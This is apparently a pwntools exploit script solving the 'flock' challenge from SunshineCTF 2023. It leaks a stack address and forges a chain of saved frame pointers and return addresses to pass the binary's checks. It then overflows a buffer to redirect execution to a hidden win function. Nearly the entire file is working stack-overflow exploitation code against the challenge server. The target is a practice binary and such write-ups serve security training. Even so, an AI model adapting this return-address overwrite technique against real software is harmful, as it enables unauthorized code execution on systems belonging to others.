#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template '--host=chal.2023.sunshinectf.games' '--port=23002' ./flock
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './flock')
context.terminal = ["kitty", "-e"]

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'chal.2023.sunshinectf.games'
port = int(args.PORT or 23002)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
break *func5+80
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

buf_size = 0x80 # bytes
ptr_size = 8 # bytes

def get_rsp():
    io.recvuntil(b"At ")
    address = io.recvline().strip()
    return int(address, 16)

def build_stack_mimic(rsp):
    nested_funcs = 5
    # this is the number of bytes allocated for local variables, in order of
    # each function (func1, func2... etc)
    alloc_memory_per_function = [
        0,    # no sub
        0x10, #        004012c1 48 83 ec 10     SUB        RSP,0x10
        0x10, #        00401297 48 83 ec 10     SUB        RSP,0x10
        0x10, #        0040126d 48 83 ec 10     SUB        RSP,0x10
        0x80, #        004011f7 48 83 c4 80     ADD        RSP,-0x80
    ]

    ret_addrs = [
        0,          # no ret_addr check
        0x4012f0,   # func2 ret_addr check
        0x4012ca,   # func3 ret_addr check
        0x4012a0,   # func4 ret_addr check
        0x401276,   # func5 ret_addr check
    ]

    stack_mimic = []

    head = rsp + alloc_memory_per_function[-1]

    for index in range(0,nested_funcs)[::-1]:
        # note: stack is built so that the ret addr is pushed, then rbp, then
        # data
        stack_mimic.append(b'c' * alloc_memory_per_function[index])
        # rbp
        if(not index): return b''.join(stack_mimic) # ignore last return
        head += alloc_memory_per_function[index-1] + 2*ptr_size 
        print(f"[*] ({index}) generated new rbp:", hex(head))
        stack_mimic.append(p64(head))
        # ret addr
        print(f"[*] ({index}) writing last ret addr:", hex(ret_addrs[index]))
        stack_mimic.append(p64(ret_addrs[index]))

    ## all that remains is to add rbp + the function address to jump to
    return b''.join(stack_mimic)

def write_starting_at_func5_rbp(payload):
    io.recvuntil(b">>> ")
    io.sendline(b''.join([
        # b'a'*buf_size,
        payload,
    ]))

rsp = get_rsp()
print("[*] received top of stack pointer:", hex(rsp))
payload = [
    build_stack_mimic(rsp),
    b'b'*ptr_size, # overwrite rbp
    p64(0x401016), # 0x0000000000401016 : ret: to align
    p64(0x4011b9), # 00000000004011b9 <win>:
    p64(0x401080), # 0000000000401080 <exit@plt>: to flush
]

print("[*] final payload:",b''.join(payload))

write_starting_at_func5_rbp(b''.join(payload))

io.interactive()

